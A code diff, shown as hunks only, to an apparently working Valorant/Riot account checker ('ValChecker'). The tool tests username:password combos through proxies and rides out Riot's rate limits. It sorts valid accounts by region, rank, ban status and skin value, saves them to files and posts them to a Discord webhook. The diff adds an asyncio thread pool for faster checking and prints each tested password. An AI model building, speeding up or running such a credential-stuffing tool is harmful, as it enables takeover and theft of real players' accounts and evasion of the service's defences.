@@ -1,3 +1,5 @@
+import asyncio
+import concurrent
 import ctypes
 import datetime
 import os
@@ -18,12 +20,11 @@ stff = staff.staff()
 
 
 class simplechecker():
-    def __init__(self, settings: list, proxylist: list, version: str) -> None:
+    def __init__(self, settings: list, proxylist) -> None:
         path = os.getcwd()
         self.parentpath = os.path.abspath(os.path.join(path, os.pardir))
         self.proxylist = proxylist
         self.inrlimit = 0
-        self.version = version
         self.max_rlimits = settings['max_rlimits']
         self.rlimit_wait = settings['rlimit_wait']
         self.cooldown = int(settings['cooldown'])
@@ -98,7 +99,7 @@ class simplechecker():
         self.regions = {'eu': 0, 'na': 0, 'ap': 0,
                         'br': 0, 'kr': 0, 'latam': 0, 'unknown': 0}
 
-    def main(self, accounts, count):
+    async def main(self, accounts, count):
         if self.webhook == '':
             self.whtext = f"{Fore.LIGHTRED_EX}Not using a webhook{Fore.RESET}"
         else:
@@ -129,21 +130,46 @@ class simplechecker():
                 ps = account.split(':')[1]
                 self.checker(us, ps)
         else:
-            while True:
-                if threading.active_count() <= self.threadam:
-                    if len(accounts) > num:
-                        try:
-                            us = accounts[num].split(':')[0]
-                            ps = accounts[num].split(':')[1]
 
-                            threading.Thread(target=self.checker,
-                                             args=(us, ps)).start()
-                            # self.printinfo()
-                            num += 1
-                        except:
-                            print("Checked all")
+            loop = asyncio.get_running_loop()
+            tasks = []
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                num = 0
+                while num < len(accounts):
+                    while len(tasks) >= self.threadam:
+                        tasks = [task for task in tasks if not task.done()]
+                        await asyncio.sleep(0.1)
+                    try:
+                        us = accounts[num].split(':')[0]
+                        ps = accounts[num].split(':')[1]
+                        task = loop.run_in_executor(executor, self.checker, us, ps)
+                        tasks.append(task)
+                        print(f'Added task for account {us}:{ps}. Current tasks: {len(tasks)}')
+                        num += 1
+                    except:
+                        print("Checked all")
+
+                while len(tasks) > 0:
+                   tasks = [task for task in tasks if not task.done()]
+                   await asyncio.sleep(0.1)
+                   # print(f'Waiting for {len(tasks)} tasks to complete...')
+
+            # while True:
+            #     if threading.active_count() <= self.threadam:
+            #         if len(accounts) > num:
+            #             try:
+            #                 us = accounts[num].split(':')[0]
+            #                 ps = accounts[num].split(':')[1]
+            #
+            #                 threading.Thread(target=self.checker,
+            #                                  args=(us, ps)).start()
+            #                 # self.printinfo()
+            #                 num += 1
+            #             except:
+            #                 print("Checked all")
 
     def checker(self, username, password):
+        #print('running')
         riotlimitinarow = 0
         proxy = sys.getproxy(self.proxylist)
         acc = f'{username}:{password}'
@@ -165,14 +191,14 @@ class simplechecker():
                         if riotlimitinarow == 0:
                             self.inrlimit += 1
                             print(sys.center(
-                                f'Rate limit. waiting {self.rlimit_wait} seconds'))
+                                f'riot limit. waiting {self.rlimit_wait} seconds'))
                         time.sleep(self.rlimit_wait)
                         riotlimitinarow += 1
                         continue
                     else:
                         # if self.print_sys==True:
                         print(sys.center(
-                            f'{self.max_rlimits} rate limits in a row. skipping'))
+                            f'{self.max_rlimits} riot limits in a row. skipping'))
                         self.inrlimit -= 1
                         riotlimitinarow = 0
                         self.rlimits += 1
@@ -223,7 +249,7 @@ class simplechecker():
                                 check.ranked(account)
                             if account.banuntil is None:
                                 try:
-                                    self.ranks[account.rank.lower().split(' ')[0]] += 1
+                                    self.ranks[account.rank] += 1
                                 except:
                                     self.ranks['unknown'] += 1
                             check.skins_en(account)
@@ -315,7 +341,6 @@ class simplechecker():
                     if banuntil == None:
                         self.valid += 1
                     bantext = ''
-                    sysrank = rank.lower().split(' ')[0]
                     if rank != 'N/A' and reg != 'N/A':
                         if banuntil != None:
                             bantext = f'\n|ban until------> {banuntil}'
@@ -323,7 +348,7 @@ class simplechecker():
                             os.mkdir(f'{self.outpath}/regions/')
                         if not exists(f'{self.outpath}/regions/{reg}/'):
                             os.mkdir(f'{self.outpath}/regions/{reg}/')
-                        with open(f'{self.outpath}/regions/{reg}/{sysrank}.txt', 'a', encoding='UTF-8') as file:
+                        with open(f'{self.outpath}/regions/{reg}/{rank}.txt', 'a', encoding='UTF-8') as file:
                             file.write(f'''
 ╔═════════════════════════════════════════════════════════════╗
 ║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
@@ -408,7 +433,7 @@ class simplechecker():
                             embed.add_embed_field(
                                 name=f'VP / RP', value=f'{vp} / {rp}')
                             embed.add_embed_field(name=f'Skins ({skinscount}) ≈ {invprice} VP', value=account.skins if account.skins.strip(
-                            ) != '' else 'drugged capybaras')
+                            ) != '' else 'no skins')
                             dcwebhook.add_embed(embed)
                             response = dcwebhook.execute()
                             # input(response)
@@ -476,7 +501,7 @@ class simplechecker():
         percent = self.valid/self.checked*100 if self.checked != 0 else 0.0
         percent = f'{str(round(percent,1))}%'
         ctypes.windll.kernel32.SetConsoleTitleW(
-            f'ValChecker {self.version}  |  Checked {self.checked}/{self.count}  |  {self.cpmtext} CPM  |  Hitrate {percent}  |  Est. time: {self.esttime}')
+            f'ValChecker by liljaba1337  |  Checked {self.checked}/{self.count}  |  {self.cpmtext} CPM  |  Hitrate {percent}  |  Est. time: {self.esttime}')
         os.system('cls')
         print(f'''
     {reset}
@@ -489,7 +514,7 @@ class simplechecker():
 {cyan} ┃ [{reset}>{cyan}] {reset}Valid          >>:{cyan}[{green}{self.valid}{cyan}] ({percent}){space * (9 - len(str(self.valid))-len(percent))}┃ ┃ [{reset}>{cyan}] {reset}EU            >>:{cyan}[{green}{self.regions['eu']}{cyan}]{space * (18 - len(str(self.regions['eu'])))}┃ ┃ [{reset}>{cyan}] {reset}1-10            >>:{cyan}[{green}{self.skinsam['1-10']}{cyan}]{space * (29 - len(str(self.skinsam['1-10'])))}┃
 {cyan} ┃ [{reset}>{cyan}] {reset}Banned         >>:{cyan}[{red}{self.banned}{cyan}]{space * (12 - len(str(self.banned)))}┃ ┃ [{reset}>{cyan}] {reset}NA            >>:{cyan}[{green}{self.regions['na']}{cyan}]{space * (18 - len(str(self.regions['na'])))}┃ ┃ [{reset}>{cyan}] {reset}10-20           >>:{cyan}[{green}{self.skinsam['10-20']}{cyan}]{space * (29 - len(str(self.skinsam['10-20'])))}┃
 {cyan} ┃ [{reset}>{cyan}] {reset}TempBanned     >>:{cyan}[{Fore.YELLOW}{self.tempbanned}{cyan}]{space * (12 - len(str(self.tempbanned)))}┃ ┃ [{reset}>{cyan}] {reset}AP            >>:{cyan}[{green}{self.regions['ap']}{cyan}]{space * (18 - len(str(self.regions['ap'])))}┃ ┃ [{reset}>{cyan}] {reset}20-35           >>:{cyan}[{green}{self.skinsam['20-35']}{cyan}]{space * (29 - len(str(self.skinsam['20-35'])))}┃
-{cyan} ┃ [{reset}>{cyan}] {reset}Rate limits    >>:{cyan}[{red}{self.rlimits}{cyan}]{space * (12 - len(str(self.rlimits)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
+{cyan} ┃ [{reset}>{cyan}] {reset}Riot Limits    >>:{cyan}[{red}{self.rlimits}{cyan}]{space * (12 - len(str(self.rlimits)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
 {cyan} ┃ [{reset}>{cyan}] {reset}Errors         >>:{cyan}[{red}{self.err}{cyan}]{space * (12 - len(str(self.err)))}┃ ┃ [{reset}>{cyan}] {reset}KR            >>:{cyan}[{green}{self.regions['kr']}{cyan}]{space * (18 - len(str(self.regions['kr'])))}┃ ┃ [{reset}>{cyan}] {reset}40-70           >>:{cyan}[{green}{self.skinsam['40-70']}{cyan}]{space * (29 - len(str(self.skinsam['40-70'])))}┃
 {cyan} ┃ [{reset}>{cyan}] {reset}Retries        >>:{cyan}[{Fore.YELLOW}{self.retries}{cyan}]{space * (12 - len(str(self.retries)))}┃ ┃ [{reset}>{cyan}] {reset}LATAM         >>:{cyan}[{green}{self.regions['latam']}{cyan}]{space * (18 - len(str(self.regions['latam'])))}┃ ┃ [{reset}>{cyan}] {reset}70+             >>:{cyan}[{green}{self.skinsam['70+']}{cyan}]{space * (29 - len(str(self.skinsam['70+'])))}┃
 {cyan} ┃                                     ┃ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┃{space * (56 - len(str(self.skinsam['1-10'])))}┃
